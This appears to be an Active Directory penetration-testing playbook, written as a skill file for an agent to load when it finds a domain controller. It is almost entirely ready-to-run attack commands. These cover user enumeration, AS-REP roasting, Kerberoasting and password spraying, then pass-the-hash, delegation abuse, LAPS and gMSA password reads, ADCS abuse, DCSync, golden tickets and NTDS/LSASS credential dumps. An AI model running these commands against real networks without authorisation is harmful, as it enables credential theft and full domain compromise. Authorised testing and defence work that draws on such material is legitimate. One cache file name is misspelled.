---
name: playbook-ad
tags: [recon, enumeration, exploitation, post_exploit]
description: Active Directory pentest playbook — Kerberos, LDAP, GPO, ADCS, delegation, lateral movement, DA paths. Load at the START of an AD engagement or when a Windows domain / DC is found. Triggers - domain controller, Kerberos 88, LDAP 389/636, domain SMB, BloodHound, kerberoast, AS-REP, NTLM, ESC1-8.
---

# Active Directory Pentest Playbook

## Prerequisites
- Domain name, DC IPs
- Initial foothold or network access to AD environment
- Credentials (if provided for gray box)

## Phase Flow

### 1. AD Enumeration (No Creds)
```bash
# Identify Domain Controllers
nmap -sV -p 88,389,636,445,3268,3269 <subnet>

# DNS enumeration
dig SRV _ldap._tcp.dc._msdcs.<domain>
dig SRV _kerberos._tcp.<domain>

# Null session enumeration
enum4linux-ng -A <dc_ip>
rpcclient -U '' -N <dc_ip> -c 'enumdomusers'
ldapsearch -x -H ldap://<dc_ip> -b "" -s base namingContexts

# SMB shares without auth
smbclient -N -L //<dc_ip>
crackmapexec smb <dc_ip> --shares -u '' -p ''
```

### 2. User Enumeration & Credential Attacks
```bash
# Kerbrute user enumeration
kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting (no creds needed)
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>
# Crack with hashcat -m 18200

# Password spraying
crackmapexec smb <dc_ip> -u users.txt -p 'Season2024!' --no-bruteforce
kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt 'Password1!'
```

### 3. Authenticated Enumeration
```bash
# BloodHound collection
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <dc_ip> -c all
# Import into BloodHound GUI → find shortest path to DA

# LDAP enumeration
ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' -b '<base_dn>' '(objectClass=user)' sAMAccountName memberOf

# Group Policy
crackmapexec smb <dc_ip> -u <user> -p '<pass>' --gpp-passwords

# Kerberoasting (requires any valid user)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request
# Crack with hashcat -m 13100
```

### 4. Privilege Escalation & Lateral Movement
```bash
# Pass-the-Hash
crackmapexec smb <targets> -u <user> -H <ntlm_hash>
impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <ntlm_hash>

# Unconstrained delegation abuse
impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc_ip>

# Resource-Based Constrained Delegation (RBCD) — you have GenericWrite/GenericAll on a computer
# 1. Create/own a machine account, set it as allowed to act for target:
impacket-rbcd -delegate-to <target$> -dc-ip <dc_ip> -action write '<domain>/<machine$>':'<pass>'
# 2. S4U2self + S4U2proxy → impersonate DA on that target:
impacket-getST -spn cifs/<target>.<domain> -impersonate administrator '<domain>/<machine$>':'<pass>'
export KRB5CCNAME=administrator@<domain>.cccache && impacket-psexec -k -no-pass <domain>/administrator@<target>

# LAPS password read (GenericRead on LAPS attrs) → local admin everywhere the attr is set
ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' -b '<base_dn>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
# gMSA passwords (principal allowed to read) — gMSADumper.py

# ADCS template abuse is the highest-probability escalation in modern AD — see svc-adcs skill FIRST
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable

# ACL abuse (GenericAll, WriteDACL, etc.)
# Use BloodHound to identify → exploit with PowerView or impacket

# DCSync (requires Replicating Directory Changes)
impacket-secretsdump <domain>/<user>:'<pass>'@<dc_ip>
```

### 5. Domain Dominance
```bash
# Golden Ticket (requires krbtgt hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<dc_ip>

# LSASS dump on DC
crackmapexec smb <dc_ip> -u admin -p '<pass>' --lsa
crackmapexec smb <dc_ip> -u admin -p '<pass>' --ntds
```

## Key AD Attack Paths
1. AS-REP Roast → crack hash → authenticated enum → Kerberoast → crack → DA
2. Password spray → creds → BloodHound → ACL abuse path → DA
3. Null session → user list → spray → delegation abuse → DA
4. NTLM relay → local admin → credential dump → lateral movement → DA
